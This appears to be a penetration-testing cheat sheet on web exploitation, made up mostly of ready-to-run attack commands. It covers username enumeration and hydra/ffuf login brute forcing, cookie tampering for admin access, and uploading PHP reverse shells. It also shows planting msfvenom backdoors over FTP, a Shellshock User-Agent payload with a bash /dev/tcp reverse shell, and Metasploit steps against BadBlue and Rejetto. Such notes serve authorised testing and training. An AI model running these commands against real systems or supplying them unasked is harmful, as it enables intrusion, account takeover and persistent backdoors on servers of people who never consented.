# Web Exploitations

## Authentication Bypass

### Username enumeration

If the login or register page tell me a message like this when i try to use a username: "**An account with this username already exists**". We can use some tools to enumerate valid users.

{% code title="ffuf" overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=X&password=X&cpassword=X" -H "Content-Type: application/x-www-form-urlencoded" -u http://DOMAIN.COM/customers/signup -mr "username already exists"

# -w: specific a list of usernames
# -X: set request method
# -d: specify the parameters with FUZZ par
# -H: set header
# -u: indicate the URL
# -mr: message which indicate that user is already exists
```
{% endcode %}

### HTTP Login Brute Force&#x20;

{% code title="hydra" overflow="wrap" %}
```bash
# first check the source code of the web page
# check the request method (POST,GET,...)
# check the login variable (user, password)
# check the error response in case of invalid creds

# use hydra tool to do login brute force
hydra -L usernames -P passwords IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
```
{% endcode %}

{% code title="ffuf" overflow="wrap" %}
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$URL/login -fc 200

# -w: declare wordlists into variables W1 and W2
# -d: set parameters with the Wordlist declared before
# -fc: positive match, avoid HTTP response 200
```
{% endcode %}

### Basic HTTP Auth Brute force

<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt DOMAIN.com http-get "/login/page/"                                                               
```
{% endcode %}



### Logic Flaw

Try to check the logic of these pages/actions for a website to find authentication bypasses:

* Reset Password Logic
* Login page Logic
* Register page Logic

#### Create a "doppelganger"

To create a new user with the same name as the target user but with a space at the beginning of the name, follow these steps..

For hacking the user **admin**. We have to create a user with this name " `admin`" (without quotes). In this way all the query for this new user will be  the same of the target user.

### Cookie Tampering

**Examining and editing the cookies** set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

If we have this cookies in a website:

```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

We can change this cookie like this to become a Admin:

```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=true; Max-Age=3600; Path=/
```



## Put file in '/uploads' folder

```bash
#! copy a revshell in php  
cp /usr/share/webshells/php/php-reverse-shell.php .
# or generate a payload 
msfvenom -p php/meterpreter_reverse_tcp lhost=IP lport=PORT -o shell.php

# Request to upload a file with revshell
curl http://IP/uploads/ --upload-file php-reverse-shell.php

# Delete file uploaded
curl -X DELETE http://IP/uploads/php-reverse-shell.php
```



## Backdoor Web via FTP

**Required:**

* WebServer connection via FTP
* User permissions to add file in web directory&#x20;

```bash
# Prepare the shell
ls -la /usr/share/webshells/
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
# Once we're in a web dir via ftp
put shell.php
```

```bash
# .aspx Payload
## create payload
msfvenom -p windows/shell/reverse_tcp LHOST=ATT_IP LPORT=ATT_PORT -f asp > shell.aspx
## -p: paylaod to use
## LHOST: attacker ip
## LPORT: attacker listener port
## -f: output format

## put payload via ftp (in ftp connection)
put shell.aspx

# set up msfconsole handler
service postgresql start && msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST ATT_IP
set LPORT ATT_PORT
```



## Targeting PHP

```bash
# PHP Enum file
/phpinfo.php


# Search vulnerable php version
searchsploit php cgi
## Select a exploit and copy it
searchsploit -m EXPLOIT_ID
vim EXPLOIT_ID
```



## Know vulns

### Shellshock

#### Manual Exploitation

```bash
# Search a .cgi sccript
 
# Run nmap script for shellshock vuln check
nmap -sV $IP --script=http-shellshock --script-args "http-shellshock.uri=/$SCRIPT.cgi"
 
# intercect the request with .cgi script vuln and edit the User-Agent header with Burp Suit
GET /test.cgi
user-Agent: () { : ; }; echo; echo; /bin/bash -c '$CMD'
 
# get a revshell
# edit $CMD field with rev shell (burp)
bash -i >/dev/tcp/$IP/$PORT 0>&1
 
# set listener port in kali machine
nc -lnvp $PORT
```

#### Automatic Explotation

```bash
#start metasploit console with database
service postgresql start && msfconsole
 
#search, conf and run metasploit module
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS IP
set RPORT PORT
set TARGETURI SCRIPT_PATH
exploit
```

### Badblue (2.7)

#### Metasploit Exploitation

```bash
searchsploit BadBlue 2.7

# BadBlue 2.7
service postgresql start && msfconsole
search BadBlue
use exploit/windows/http/badblue_passthru
set RHOSTS IP
show options
exploit
```



### Rejetto (HttpFileServer 2.3)

#### Manual Exploitation

```bash
# Search exploit
searchsploit rejetto
# Copy the script
searchsploit -m 39161
```

1. Read and edit python script (ip\_addr, local\_port)
2. Set listener (nc -nvlp 1234)
3. Set a python web server in a directory where there is nc.exe file (python3 -m http.server 80)\
   -> (/usr/share/windows-resources/binaries)
4. run the script (python3 39161.py IP PORT)

#### Metasploit Exploitation

```bash
service postgresql start && msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS
set TARGETURI
exploit
```
